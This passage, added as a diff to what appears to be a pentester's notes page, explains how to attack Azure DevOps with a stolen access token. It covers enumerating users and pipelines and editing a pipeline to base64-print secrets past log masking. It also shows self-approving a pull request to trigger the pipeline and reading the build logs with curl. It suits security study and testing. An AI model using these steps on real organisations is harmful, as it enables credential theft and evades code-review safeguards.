@@ -111,3 +111,96 @@ $ mssql-cli -S [someserver].database.windows.net -d [database] -U [username] -P 
 If you have access to a VPN that gets you access into the internal Azure network, you can directly access internal ports of machines that might expose sensitive information, or allow other attacks now that they are accessible.&#x20;
 
 In Azure, you can look for **Virtual Networks** in the search bar to find a list of VPNs, and then selecting one and viewing **Connected Devices** will list all devices and their IP addresses. For a big network, this can save some time in scanning the network to quickly find all devices.&#x20;
+
+## Azure DevOps
+
+Azure DevOps is used for automating [git.md](../forensics/git.md "mention"), similar to a platform like GitHub. Here you can create CI/CD **pipelines** that perform jobs after certain actions like pushes, pull requests, or merges. Authentication is done via a username/password combination, or Personal Access Tokens (PAT), for example: `ssqvxymhhbyplmejw43qltw55755kpmnwxn5xkzbv3iy55lqznhq`. If any of these are compromised you can gain initial access to the repositories in the Azure DevOps environment.&#x20;
+
+{% embed url="https://learn.microsoft.com/en-us/azure/devops/cli/?view=azure-devops" %}
+Install the Azure CLI extension for DevOps
+{% endembed %}
+
+Using `az devops login` you will be prompted for a token, or the regular `az login` for interactive username/password authentication. A useful next step is to configure some default options so that you don't have to include them in all future commands ([CLI documentation](https://learn.microsoft.com/en-us/cli/azure/service-page/devops?view=azure-cli-latest)):
+
+{% code overflow="wrap" %}
+```bash
+az devops configure --defaults organization=https://dev.azure.com/$ORGANIZATION
+az devops configure --defaults project=$PROJECT_ID
+```
+{% endcode %}
+
+If unknown, this `$PROJECT_ID` can be found using `az devops project list`. Here you will find one or more GUIDs like `1ea7df6c-1e09-4bb1-b68d-66403b0d10f4`. Some enumeration can now be done to get a better understanding of the environment:
+
+```bash
+az devops user list  # All information about all users
+az devops user list | jq '.items[].user | { displayName, mailAddress }'  # Simplify
+az repos list  # All information about all repositories
+az pipelines list  # All information about all pipelines
+az pipelines list | jq '.[].name'  # Only show names
+```
+
+### Leaking pipeline variables
+
+Many pipelines use public/secret variables to perform their jobs. To list these for a pipeline found in the previous section (eg. `ExamplePipeline`), simply run the following command:
+
+```bash
+az pipelines variable list --pipeline-name "ExamplePipeline"
+```
+
+Public variables will already have a filled-in `value` attribute while secrets are just `null`. These cannot be shown directly, only used in pipelines. This means however that if you can **edit** **the pipeline** it becomes possible to exfiltrate these variables while they're being used. An easy way to do this is printing it to the log output, but exfiltrating through the internet is also an option.&#x20;
+
+Start by cloning the repository where the pipeline is defined, where you will find a `.yml` file that defines _when_ to execute _what_. By adding some commands that print the variable we can later read them in the logs after it has executed.&#x20;
+
+```bash
+git clone https://$USER@dev.azure.com/$ORGANIZATION/$PROJECT_ID/_git/$REPO
+git branch --list
+```
+
+{% code title="helloworld-pipeline.yml" %}
+```diff
+  pr:
+    branches:
+      include:
+        - acceptance*
+        - 'production'
+  
+  pool:
+    vmImage: ubuntu-latest
+  
+  steps:
+  - script: |
++     echo $(token) | base64  # Prevent Azure from censoring in output
+      echo "##vso[task.complete result=Succeeded;]Hello, world!"
+    displayName: 'Example pipeline'
+```
+{% endcode %}
+
+Now the top of this file defines _when_ it executes, to trigger it we need to make sure this happens. The above example runs when a Pull Request (PR) is created on a branch called 'production' or that starts with 'acceptance'. If we only have a PAT, we have to use the Azure CLI to make this pull request (or any other required action).&#x20;
+
+```bash
+git branch leak-token  # Make your changes to the pipeline here
+git add .
+git commit -m "leak token pipeline variable in output"
+git push --set-upstream origin leak-token
+# Now the branch is on remote, and a "push" pipeline would be triggered
+# The command below will trigger a "pr" pipeline:
+az repos pr create --repository $REPO --source-branch leak-token --target-branch acceptance
+# For a "merge" pipeline this PR needs to be accepted, which you may be able to do:
+az repos pr list --repository $REPO  # Find ID of created PR
+az repos pr set-vote --id $PR_ID --vote approve
+az repos pr update --id $PR_ID --status completed  # This performs the merge, if permitted
+```
+
+After you think your pipeline has been executed, you can check the build logs. The first step is finding the build ID associated with your commit. Because not everything is possible in the Azure CLI, we will use `curl` to make the requests manually ([REST API documentation](https://learn.microsoft.com/en-us/rest/api/azure/devops/build/builds?view=azure-devops-rest-7.2)):&#x20;
+
+{% code overflow="wrap" %}
+```bash
+curl -u :ssqvxymhhbyplmejw43qltw55755kpmnwxn5xkzbv3iy55lqznhq https://dev.azure.com/$ORGANIZATION/$PROJECT_ID/_apis/build/builds | jq '.value[] | { message: .triggerInfo["ci.message"], id }'
+# The topmost (newest) build is likely the one you triggered
+curl -u :ssqvxymhhbyplmejw43qltw55755kpmnwxn5xkzbv3iy55lqznhq https://dev.azure.com/$ORGANIZATION/$PROJECT_ID/_apis/build/builds/$BUILD_ID/logs
+# All log IDs will be shown, just try reading them one by one to find your output
+curl -u :ssqvxymhhbyplmejw43qltw55755kpmnwxn5xkzbv3iy55lqznhq https://dev.azure.com/$ORGANIZATION/$PROJECT_ID/_apis/build/builds/$BUILD_ID/logs/$LOG_ID
+```
+{% endcode %}
+
+After you find your base64 output in the logs, just decode it to get the secret. This way you may gain more access to the rest of the DevOps environment to find more sensitive information or perform actions with more access.
